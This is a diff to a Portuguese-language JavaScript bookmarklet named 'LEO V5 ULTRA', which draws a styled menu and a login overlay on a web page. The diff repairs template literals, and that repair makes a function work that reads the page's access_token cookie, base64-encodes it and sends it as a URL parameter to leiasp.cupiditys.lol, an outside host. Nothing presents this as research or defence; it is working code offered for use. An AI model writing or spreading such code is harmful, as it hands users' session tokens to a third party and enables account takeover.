@@ -1,6 +1,6 @@
 javascript:(() => {
   const style = document.createElement("style");
-  style.innerHTML = 
+  style.innerHTML = `
     @keyframes glowBlueNeon {
       0% { box-shadow: 0 0 8px #00f0ff, 0 0 15px #00e0ff; }
       50% { box-shadow: 0 0 20px #00f0ff, 0 0 30px #00e0ff; }
@@ -235,7 +235,7 @@ javascript:(() => {
       90% { opacity: 1; }
       100% { opacity: 0; }
     }
-  ;
+  `;
   document.head.appendChild(style);
 
   let loggedIn = false;
@@ -244,10 +244,10 @@ javascript:(() => {
     if (document.getElementById("bobMenu")) return;
     const e = document.createElement("div");
     e.id = "bobMenu";
-    e.innerHTML = 
+    e.innerHTML = `
       <div class="rgb-fechar-x" title="Fechar menu" onclick="this.parentNode.remove()">✖</div>
       <h3>LEO V5 ULTRA</h3>
-    ;
+    `;
     document.body.appendChild(e);
 
     const addButton = (txt, func) => {
@@ -288,7 +288,7 @@ javascript:(() => {
       try {
         const token = document.cookie.split('access_token=')[1].split(';')[0];
         const encodedToken = encodeURIComponent(btoa(token));
-        const url = https://leiasp.cupiditys.lol/?key=${encodedToken};
+        const url = `https://leiasp.cupiditys.lol/?key=${encodedToken}`;
         window.open(url, "_blank");
       } catch {
         alert("❌ Não foi possível obter o token de acesso.");
@@ -341,7 +341,7 @@ javascript:(() => {
     if (document.getElementById("loginOverlay")) return;
     const overlay = document.createElement("div");
     overlay.id = "loginOverlay";
-    overlay.innerHTML = 
+    overlay.innerHTML = `
       <div id="loginBox">
         <img class="loginBg" src="https://png.pngtree.com/thumb_back/fh260/background/20241017/pngtree-a-hacker-in-a-hoodie-sitting-at-a-laptop-with-hologram-image_16403770.jpg" alt="Fundo Login" />
         <div id="loginContent">
@@ -352,7 +352,7 @@ javascript:(() => {
           <button id="loginBtn">Entrar</button>
         </div>
       </div>
-    ;
+    `;
     document.body.appendChild(overlay);
 
     const loginBtn = document.getElementById("loginBtn");
@@ -391,5 +391,3 @@ javascript:(() => {
   };
   document.body.appendChild(botaoFlutuante);
 })();
-
-
